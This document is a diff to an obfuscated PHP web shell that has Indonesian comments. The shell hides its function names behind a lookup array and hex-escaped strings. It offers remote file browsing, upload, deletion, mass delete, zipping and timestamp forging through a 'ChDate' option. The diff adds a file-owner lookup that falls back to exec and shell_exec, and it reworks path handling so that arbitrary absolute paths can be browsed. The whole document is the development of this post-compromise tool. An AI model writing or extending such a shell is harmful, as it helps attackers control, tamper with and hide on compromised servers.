@@ -110,6 +110,31 @@ function getNumericPerms($file){
     return $f[21]($f[15]("\x25\x6f", $perms), -4);
 }
 
+function getOwner($file){
+    global $f;
+    // Cek apakah fungsi posix_getpwuid tersedia
+    if (function_exists("\x70\x6f\x73\x69\x78\x5f\x67\x65\x74\x70\x77\x75\x69\x64")) { // posix_getpwuid
+        $uid = @fileowner($file);
+        if ($uid !== false) {
+            $info = @posix_getpwuid($uid);
+            return $info ? $info["\x6e\x61\x6d\x65"] : (string)$uid; // name
+        }
+    }
+    // Fallback: gunakan exec langsung tanpa fungsi exe()
+    if ($f[6]("\x65\x78\x65\x63")) { // function_exists("exec")
+        $output = [];
+        @exec("\x6c\x73\x20\x2d\x6c\x64\x20" . escapeshellarg($file) . "\x20\x32\x3e\x2f\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x7c\x20\x61\x77\x6b\x20\x27\x7b\x70\x72\x69\x6e\x74\x20\x24\x33\x7d\x27", $output); // ls -ld file 2>/dev/null | awk '{print $3}'
+        $owner = trim(implode("\n", $output));
+        return $owner ?: "\x3f\x3f\x3f"; // ???
+    }
+    if ($f[6]("\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63")) { // function_exists("shell_exec")
+        $owner = @shell_exec("\x6c\x73\x20\x2d\x6c\x64\x20" . escapeshellarg($file) . "\x20\x32\x3e\x2f\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x7c\x20\x61\x77\x6b\x20\x27\x7b\x70\x72\x69\x6e\x74\x20\x24\x33\x7d\x27"); // ls -ld file 2>/dev/null | awk '{print $3}'
+        $owner = trim($owner);
+        return $owner ?: "\x3f\x3f\x3f"; // ???
+    }
+    return "\x3f\x3f\x3f"; // ???
+}
+
 function delete_recursive($target) {
     global $f;
     if (!$f[16]($target)) return true;
@@ -148,9 +173,36 @@ function formatSizeDisplay($bytes){
     else return $bytes."\x20\x42";
 }
 // --- INITIAL SETUP & PATH ---
-$path = $f[23](isset($_GET["\x70\x61\x74\x68"]) ? $_GET["\x70\x61\x74\x68"] : $f[24]());
-$path = $f[25]("\x5c","\x2f",$path);
+// $path = $f[23](isset($_GET["\x70\x61\x74\x68"]) ? $_GET["\x70\x61\x74\x68"] : $f[24]());
+// $path = $f[25]("\x5c","\x2f",$path);
+// Dapatkan base directory
+$base_dir = $f[24](); // getcwd
+$base_dir = $f[25]("\x5c","\x2f",$base_dir); // str_replace
+$base_dir = rtrim($base_dir, "\x2f"); // rtrim /
 
+// Dapatkan requested path
+if (isset($_GET["\x70\x61\x74\x68"])) {
+    $requested_path = $_GET["\x70\x61\x74\x68"];
+    $requested_path = $f[25]("\x5c","\x2f",$requested_path);
+    
+    // Jika path relatif, gabungkan dengan base_dir
+    if (strpos($requested_path, "\x2f") !== 0) { // tidak dimulai dengan /
+        $path = $base_dir . "\x2f" . $requested_path;
+    } else {
+        $path = $requested_path;
+    }
+} else {
+    $path = $base_dir;
+}
+
+// Hilangkan double slash
+while (strpos($path, "\x2f\x2f") !== false) {
+    $path = $f[25]("\x2f\x2f", "\x2f", $path); // str_replace //
+}
+// Hilangkan trailing slash kecuali root
+if ($path !== "\x2f") {
+    $path = rtrim($path, "\x2f");
+}
 // --- HANDLERS ---
 if(isset($_FILES["\x66\x69\x6c\x65\x5f\x75\x70\x6c\x6f\x61\x64"])){
     $file_name = sanitizeFilename($_FILES["\x66\x69\x6c\x65\x5f\x75\x70\x6c\x6f\x61\x64"]["\x6e\x61\x6d\x65"]);
@@ -390,7 +442,7 @@ if ($show_file_list) {
     echo '<form method="POST" action="?path='.$f[38]($path).'">';
     echo '<div id="content"><table><tr class="first">';
     echo '<th><input type="checkbox" onclick="document.querySelectorAll(\'.file-checkbox\').forEach(e=>e.checked=this.checked);"></th>';
-    echo '<th>Name</th><th>Size</th><th>Perm</th><th>Last Modified</th><th>Options</th></tr>';
+    echo '<th>Name</th><th>Size</th><th>Perm</th><th>Owner</th><th>Last Modified</th><th>Options</th></tr>';
     $scandir_items = @$f[19]($path);
     if ($scandir_items) {
         $f[47]($scandir_items, function($a, $b) use ($path, $f) {
@@ -418,6 +470,7 @@ if ($show_file_list) {
             else echo "<i class='fa fa-file-o'></i> <a href=\"?action=view_file&target_file=$encoded_full_item_path&path=".$f[38]($path)."\">".$f[28]($item)."</a>";
             echo "<td class='td_home' style='text-align:center;color:#fff;'>".$file_size."</td>";
             echo "<td class='td_home' style='text-align:center;'><font color='".$perm_color."'>".$file_perms."</font></td>";
+            echo "<td class='td_home' style='text-align:center;color:#fff;'>".getOwner($full_item_path)."</td>";
             echo "<td class='td_home' style='text-align:center;color:#fff;'>".$file_mtime."</td>";
             echo "<td class='td_home' style='text-align:center;'><select style='width:100px;background:#000;color:#FFD700;border:1px solid #FFD700;' onchange=\"if(this.value) window.location.href='?action='+this.value+'&target_file={$encoded_full_item_path}&path=".$f[38]($path)."'\"><option value=''>Action</option><option value='delete'>Delete</option>";
             if($is_file) {
@@ -428,9 +481,9 @@ if ($show_file_list) {
             if($is_file) echo "<option value='chdate_form'>ChDate</option>";
             echo "</select></td></tr>";
         }
-    } else { echo "<tr><td colspan='5' style='text-align:center;'><font color='red'>Gagal membaca direktori.</font></td></tr>"; }
+    } else { echo "<tr><td colspan='7' style='text-align:center;'><font color='red'>Gagal membaca direktori.</font></td></tr>"; }
     if ($f[30]("\x5a\x69\x70\x41\x72\x63\x68\x69\x76\x65")) {
-        echo '<tfoot><tr class="first"><td colspan="6" style="padding:10px;">With selected: <select name="bulk_action" style="background:#000;color:#FFD700;border:1px solid #FFD700;"><option value="">Choose...</option><option value="zip_selected">Zip</option><option value="delete_selected">Mass Delete</option></select> <input type="submit" value="Go"></td></tr></tfoot>';
+        echo '<tfoot><tr class="first"><td colspan="7" style="padding:10px;">With selected: <select name="bulk_action" style="background:#000;color:#FFD700;border:1px solid #FFD700;"><option value="">Choose...</option><option value="zip_selected">Zip</option><option value="delete_selected">Mass Delete</option></select> <input type="submit" value="Go"></td></tr></tfoot>';
     }
     echo '</table></div></form>';
 }
